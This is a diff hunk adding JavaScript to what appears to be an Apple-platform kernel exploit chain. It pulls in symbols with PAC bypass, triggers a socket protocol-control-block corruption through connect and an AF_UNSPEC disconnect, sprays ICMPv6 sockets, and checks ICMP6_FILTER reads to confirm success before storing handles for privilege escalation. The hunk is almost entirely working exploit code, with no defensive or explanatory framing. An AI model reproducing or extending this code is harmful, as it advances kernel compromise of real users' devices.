@@ -7273,6 +7273,51 @@
           LOG(`[M5] getsockopt read: ${r0.hex()} ${r1.hex()}`);
         }
 
+        // ===== M5 PCB corruption via connect/disconnectx =====
+        LOG("[M5] Step 3: Testing pcb corruption via connect/disconnectx...");
+        let connect_sym = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "connect");
+        LOG(`[M5] gpuDlsym(connect) = ${connect_sym.hex()}`);
+        let disconnectx_sym = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "disconnectx");
+        LOG(`[M5] gpuDlsym(disconnectx) = ${disconnectx_sym.hex()}`);
+
+        if (connect_sym.noPAC() != 0n) {
+          // Build sockaddr_in6 for ::1 (localhost)
+          let sockaddr = mpd_malloc(28n);
+          mpd_write8(sockaddr, 28n); mpd_write8(sockaddr + 1n, 30n);
+          for (let i = 0n; i < 24n; i++) mpd_write8(sockaddr + 2n + i, 0n);
+          mpd_write8(sockaddr + 8n + 15n, 1n); // ::1
+
+          LOG("[M5] Calling connect(control, ::1)...");
+          let conn_ret = mpd_fcall(connect_sym.noPAC(), control_sock, sockaddr, 28n, 0n, 0n, 0n, 0n, 0n);
+          LOG(`[M5] connect() = ${conn_ret}`);
+
+          // disconnectx doesn't work for DGRAM sockets. Use connect(AF_UNSPEC) instead.
+          LOG("[M5] Disconnecting via connect(AF_UNSPEC)...");
+          let unspec_sa = mpd_malloc(28n);
+          for (let i = 0n; i < 28n; i++) mpd_write8(unspec_sa + i, 0n); // all zeros = AF_UNSPEC
+          let dis_ret = mpd_fcall(connect_sym.noPAC(), control_sock, unspec_sa, 28n, 0n, 0n, 0n, 0n, 0n);
+          LOG(`[M5] connect(AF_UNSPEC) = ${dis_ret}`);
+
+          if (dis_ret == 0n) {
+            LOG("[M5] PCB disconnected! Spraying ICMPv6 sockets...");
+            for (let i = 0; i < 20; i++) {
+              let spray_fd = mpd_fcall(socket_raw.noPAC(), AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6, 0n, 0n, 0n, 0n, 0n);
+            }
+            // Test getsockopt on rw_sock after spray
+            let spray_buf = mpd_malloc(EARLY_KRW_LENGTH);
+            let spray_len = mpd_malloc(8n);
+            mpd_write64(spray_len, EARLY_KRW_LENGTH);
+            let gs2 = mpd_fcall(getsockopt_raw.noPAC(), rw_sock, IPPROTO_ICMPV6, ICMP6_FILTER, spray_buf, spray_len, 0n, 0n, 0n);
+            LOG(`[M5] getsockopt after spray = ${gs2}`);
+            let s0 = mpd_read64(spray_buf);
+            let s1 = mpd_read64(spray_buf + 8n);
+            LOG(`[M5] spray read: ${s0.hex()} ${s1.hex()}`);
+            if (s0 != 0xffffffffffffffffn || s1 != 0xffffffffffffffffn) {
+              LOG("[M5] Pcb corruption SUCCESS — filter data changed!");
+            }
+          }
+        }
+
         // Store function pointers and socket fds in IOSurface for PE
         uwrite64(surface_address + 0xF850n, control_sock);
         uwrite64(surface_address + 0xF858n, rw_sock);
